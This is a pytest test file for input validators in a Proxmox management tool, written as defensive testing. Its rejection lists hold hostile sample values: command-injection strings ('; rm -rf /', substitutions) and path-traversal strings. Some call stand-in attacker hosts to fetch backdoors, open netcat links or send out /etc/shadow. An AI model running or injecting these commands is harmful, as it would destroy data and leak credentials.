"""Tests for Proxmox validation utilities."""

import pytest
from src.utils.validation import validate_vmid, validate_node_name, validate_storage_name


class TestVMIDValidation:
    """Test VMID validation."""
    
    def test_valid_vmids(self):
        """Test valid VMIDs."""
        valid_vmids = [
            100,  # Minimum valid VMID
            999999,  # Maximum valid VMID
            "100",  # String representation
            "12345",  # Mid-range
            1000,
            50000
        ]
        
        for vmid in valid_vmids:
            assert validate_vmid(vmid) is True, f"Expected VMID '{vmid}' to be valid"
    
    def test_invalid_vmids(self):
        """Test invalid VMIDs."""
        invalid_vmids = [
            0,  # Too small
            99,  # Below minimum
            1000000,  # Above maximum
            -1,  # Negative
            "not-a-number",  # Not numeric
            "100; rm -rf /",  # Injection attempt
            "100 && reboot",  # Command injection
            "",  # Empty string
            None,  # None
            [],  # List
            {},  # Dict
            "100`whoami`",  # Command injection
            "100$(id)"  # Command injection
        ]
        
        for vmid in invalid_vmids:
            assert validate_vmid(vmid) is False, f"Expected VMID '{vmid}' to be invalid"
    
    def test_vmid_range_boundaries(self):
        """Test VMID range boundaries."""
        # Just below valid range
        assert validate_vmid(99) is False
        # Start of valid range
        assert validate_vmid(100) is True
        # End of valid range
        assert validate_vmid(999999) is True
        # Just above valid range
        assert validate_vmid(1000000) is False


class TestNodeNameValidation:
    """Test node name validation."""
    
    def test_valid_node_names(self):
        """Test valid node names."""
        valid_names = [
            "pve",
            "node1",
            "proxmox-host",
            "server_01",
            "MyNode",
            "node-123",
            "test_node"
        ]
        
        for name in valid_names:
            assert validate_node_name(name) is True, f"Expected node name '{name}' to be valid"
    
    def test_invalid_node_names_with_injection(self):
        """Test invalid node names with injection attempts."""
        invalid_names = [
            "",  # Empty
            None,  # None
            123,  # Not a string
            "node; rm -rf /",  # Command injection
            "node && reboot",  # Command injection
            "node | cat /etc/passwd",  # Command injection
            "node`whoami`",  # Command injection
            "node$(id)",  # Command injection
            "../../../etc/passwd",  # Path traversal
            "node/../../../etc",  # Path traversal
            "node with spaces",  # Spaces not allowed
            "node.with.dots",  # Dots not allowed
            "node/with/slashes",  # Slashes not allowed
            "node\\with\\backslashes",  # Backslashes not allowed
            "node@host",  # Special chars not allowed
            "node#123",  # Special chars not allowed
        ]
        
        for name in invalid_names:
            assert validate_node_name(name) is False, f"Expected node name '{name}' to be invalid"


class TestStorageNameValidation:
    """Test storage name validation."""
    
    def test_valid_storage_names(self):
        """Test valid storage names."""
        valid_names = [
            "local",
            "local-lvm",
            "nfs_storage",
            "ceph-pool",
            "storage1",
            "my-storage",
            "STORAGE"
        ]
        
        for name in valid_names:
            assert validate_storage_name(name) is True, f"Expected storage name '{name}' to be valid"
    
    def test_invalid_storage_names(self):
        """Test invalid storage names with injection attempts."""
        invalid_names = [
            "",  # Empty
            None,  # None
            123,  # Not a string
            "storage; rm -rf /",  # Command injection
            "storage && wget evil.com/backdoor",  # Command injection
            "storage | nc evil.com 1234",  # Command injection
            "storage`id`",  # Command injection
            "storage$(whoami)",  # Command injection
            "../../../etc/storage",  # Path traversal
            "storage/../../../etc",  # Path traversal
            "storage with spaces",  # Spaces not allowed
            "storage.name",  # Dots not allowed
            "storage/path",  # Slashes not allowed
            "storage\\path",  # Backslashes not allowed
        ]
        
        for name in invalid_names:
            assert validate_storage_name(name) is False, f"Expected storage name '{name}' to be invalid"


class TestValidationIntegration:
    """Test validation in context of API calls."""
    
    def test_vm_operation_parameters(self):
        """Test typical VM operation parameters."""
        # Valid VM operation
        node = "pve"
        vmid = "100"
        
        assert validate_node_name(node) is True
        assert validate_vmid(vmid) is True
        
        # Invalid VM operation (injection attempt)
        malicious_node = "pve; rm -rf /"
        malicious_vmid = "100`id`"
        
        assert validate_node_name(malicious_node) is False
        assert validate_vmid(malicious_vmid) is False
    
    def test_storage_operation_parameters(self):
        """Test typical storage operation parameters."""
        # Valid storage operation
        node = "pve"
        storage = "local-lvm"
        
        assert validate_node_name(node) is True
        assert validate_storage_name(storage) is True
        
        # Invalid storage operation (path traversal)
        malicious_storage = "../../../etc/storage"
        
        assert validate_storage_name(malicious_storage) is False
    
    def test_snapshot_operation_parameters(self):
        """Test typical snapshot operation parameters."""
        # Valid snapshot operation
        node = "proxmox-1"
        vmid = 12345
        snapname = "pre-update"
        
        assert validate_node_name(node) is True
        assert validate_vmid(vmid) is True
        # snapname would need its own validator if we add one
        
        # Invalid snapshot operation
        malicious_node = "node && reboot"
        
        assert validate_node_name(malicious_node) is False


class TestSecurityScenarios:
    """Test specific security attack scenarios."""
    
    def test_command_injection_prevention(self):
        """Test that common command injection patterns are blocked."""
        command_injection_patterns = [
            "; rm -rf /",
            "&& cat /etc/passwd",
            "| nc evil.com 1234",
            "`whoami`",
            "$(id)",
            "; reboot",
            "&& wget http://evil.com/backdoor.sh",
            "|| curl http://attacker.com/exfil?data=$(cat /etc/shadow)"
        ]
        
        for pattern in command_injection_patterns:
            test_input = f"node{pattern}"
            assert validate_node_name(test_input) is False, \
                f"Command injection pattern should be blocked: {pattern}"
    
    def test_path_traversal_prevention(self):
        """Test that path traversal patterns are blocked."""
        path_traversal_patterns = [
            "../",
            "../../",
            "../../../etc/passwd",
            "..\\..\\windows",
            "/etc/passwd",
            "\\windows\\system32"
        ]
        
        for pattern in path_traversal_patterns:
            assert validate_node_name(pattern) is False, \
                f"Path traversal pattern should be blocked: {pattern}"
            assert validate_storage_name(pattern) is False, \
                f"Path traversal pattern should be blocked: {pattern}"


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
